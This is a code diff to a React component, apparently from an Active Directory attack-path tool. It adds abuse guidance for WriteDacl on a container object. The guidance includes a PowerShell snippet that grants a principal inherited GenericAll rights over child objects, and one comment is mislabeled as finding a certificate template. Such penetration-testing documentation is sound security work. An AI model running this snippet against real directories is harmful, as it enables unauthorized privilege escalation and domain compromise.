@@ -17,6 +17,7 @@
 import { FC } from 'react';
 import { Link, Typography } from '@mui/material';
 import { EdgeInfoProps } from '../index';
+import CodeController from '../CodeController/CodeController';
 
 const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
     sourceName,
@@ -862,6 +863,37 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
                         its gPLink attribute, making all child users and computers apply the malicious GPO and execute
                         arbitrary commands.
                     </Typography>
+                </>
+            );
+        case 'Container':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With WriteDacl on the container object, you may grant yourself the GenericAll permission
+                        inherited to child objects.
+                    </Typography>
+                    <Typography variant='body2'>This can be done with PowerShell:</Typography>
+                    <CodeController>
+                        {`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
+                            $principalName = "principal"     # SAM account name of principal
+                            
+                            # Find the certificate template
+                            $template = [ADSI]"LDAP://$containerDN"
+                            
+                            # Construct the ACE
+                            $account = New-Object System.Security.Principal.NTAccount($principalName)
+                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
+                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
+                                $sid,
+                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+                                [System.Security.AccessControl.AccessControlType]::Allow,
+                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
+                            )
+                            # Add the new ACE to the ACL
+                            $acl = $template.psbase.ObjectSecurity
+                            $acl.AddAccessRule($ace)
+                            $template.psbase.CommitChanges()`}
+                    </CodeController>
                 </>
             );
         case 'CertTemplate':
